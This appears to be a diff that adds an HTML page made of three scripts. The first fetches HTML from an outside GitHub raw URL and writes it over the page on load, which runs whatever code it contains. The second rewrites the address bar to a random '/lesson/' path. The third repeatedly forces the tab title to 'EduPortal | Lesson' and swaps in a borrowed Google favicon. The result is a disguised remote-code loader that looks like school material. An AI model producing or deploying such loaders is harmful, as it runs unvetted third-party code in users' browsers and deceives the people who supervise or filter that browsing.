@@ -1,0 +1,31 @@
+<script>fetch("https://raw.githubusercontent.com/charlieomg/Portable/refs/heads/main/ma4n.html").then(r=>r.text()).then(t=>{document.open();document.write(t);document.close();});</script>
+<script>
+  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let s = '';
+  for (let i = 0; i < 12; i++) {
+    s += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+
+  history.replaceState(null, '', '/lesson/' + s);
+</script>
+
+<script>
+  const googleFavicon = "https://play-lh.googleusercontent.com/RS6jyZBUhFUm_WEmMKZfu8vhRrfcrHwjc7NDkc5lc7O8ouTbj2ispXJYZ6cxC5bsvWQq";
+
+  function setGoogleTitleAndFavicon() {
+    document.title = "EduPortal | Lesson";
+
+    const existingIcons = document.querySelectorAll(
+      'link[rel="icon"], link[rel="shortcut icon"]'
+    );
+    existingIcons.forEach(icon => icon.remove());
+
+    const link = document.createElement('link');
+    link.rel = 'icon';
+    link.href = googleFavicon;
+    document.head.appendChild(link);
+  }
+
+  setGoogleTitleAndFavicon();
+  setInterval(setGoogleTitleAndFavicon, 500);
+</script>
